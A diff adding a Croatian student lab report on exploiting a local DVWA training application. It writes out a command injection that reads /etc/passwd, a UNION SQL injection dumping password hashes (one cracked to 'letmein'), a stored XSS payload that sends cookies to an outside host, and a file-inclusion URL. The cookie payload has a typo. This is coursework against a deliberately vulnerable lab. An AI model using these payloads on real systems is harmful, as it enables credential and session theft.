@@ -1,0 +1,107 @@
+Prateći uputstva u materijalima došao sam do problema pri spajanju na stranicu od dvwa ip-om koje mi je bash ispisao.
+Problem sam riješio upisivanjem ip adrese  127.0.0.1, koju je kolega dobio prilikom konzultacija.
+
+1.) 
+Naredbu koju sam unio u dvwa : 1 | cat /etc/passwd
+Ispis:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+Objašnjenje:
+Naredba cat printa sadržaj neke datoteke 
+
+2.)
+Kada unesem sql injekciju : 'OR 0=0 UNION SELECT password, last_name FROM users # dobivam ispis cijele baze podataka.
+Iz toga mogu zaključiti da je kompletna naredba: $query = "SELECT first_name, last_name FROM users WHERE user_id = '$user_input';";
+Umjesto &user_input unosim novi sql upit te se ispisuje sve unutar toga upita.
+
+Ispis baze podataka:
+ID: 'OR 0=0 UNION SELECT password, last_name FROM users #
+First name: admin
+Surname: admin
+
+ID: 'OR 0=0 UNION SELECT password, last_name FROM users #
+First name: Gordon
+Surname: Brown
+
+ID: 'OR 0=0 UNION SELECT password, last_name FROM users #
+First name: Hack
+Surname: Me
+
+ID: 'OR 0=0 UNION SELECT password, last_name FROM users #
+First name: Pablo
+Surname: Picasso
+
+ID: 'OR 0=0 UNION SELECT password, last_name FROM users #
+First name: Bob
+Surname: Smith
+
+ID: 'OR 0=0 UNION SELECT password, last_name FROM users #
+First name: 5f4dcc3b5aa765d61d8327deb882cf99
+Surname: admin
+
+ID: 'OR 0=0 UNION SELECT password, last_name FROM users #
+First name: e99a18c428cb38d5f260853678922e03
+Surname: Brown
+
+ID: 'OR 0=0 UNION SELECT password, last_name FROM users #
+First name: 8d3533d75ae2c3966d7e0d4fcc69216b
+Surname: Me
+
+ID: 'OR 0=0 UNION SELECT password, last_name FROM users #
+First name: 0d107d09f5bbe40cade3de5c71e9e9b7
+Surname: Picasso
+
+ID: 'OR 0=0 UNION SELECT password, last_name FROM users #
+First name: 5f4dcc3b5aa765d61d8327deb882cf99
+Surname: Smith
+
+Sada mogu umjesto upita za cijelu bazu podataka unijeti sql upit specificno za korisnika Pabla Picassa.
+Sql injekcija u polje user_id : ' UNION SELECT first_name, password FROM users WHERE first_name = 'Pablo' AND last_name = 'Picasso
+Te dobivam zapis:
+
+ID: ' UNION SELECT first_name, password FROM users WHERE first_name = 'Pablo' AND last_name = 'Picasso
+First name: Pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+
+Surname mogu prepoznati da je to zapravo šifra od korisnika Pabla Picassa.
+Te na stranici s linkom https://crackstation.net/ dobivam rezultat letmein.
+
+3.) 
+Prvo ulazim u web developer tools i u putanju body.home>div#container>div#main_body>div.body_padded>div.vulnerable_code_area>form>table>tbody
+U prvom i drugom elemtnu tr (name i message polje) micem maxlength radi mogucnosti umetanje cijelog javascript koda.
+Sada za čitanje kolačića u alert() prozoru upisujem u message polje <script>alert(document.cookie)</script> a u name proizvoljan string.
+Time dobivam: 
+PHPSESSID=k3e21jn48vlkmvkp7683fpauk1; security=low
+Ako želim predati sve kolačiće korisnika kao parametar na http://public.tel.fer.hr/srs 
+upisujem u name proizvoljan string a u message:
+<script>
+document.lcation.href='http://public.tel.fer.hr/srs?cookie='+document.cookie;
+</script>
+Te sada svaki put kada stisnem sign guestbook (posaljem get http zahtjev) redirektirat ce me na gore navedenu stranicu sa informacijama o cookiesima.
+
+
+4.)
+http://127.0.0.1/vulnerabilities/fi/?page=/etc/passwd
+Ovaj propust je moguć vrlo vjerojatno zbog loše kontrole pristupa.
+Moguće je sanirati davanjem permissiona određenim pojedincima te provjerom traženjem pristupa
+
+
+
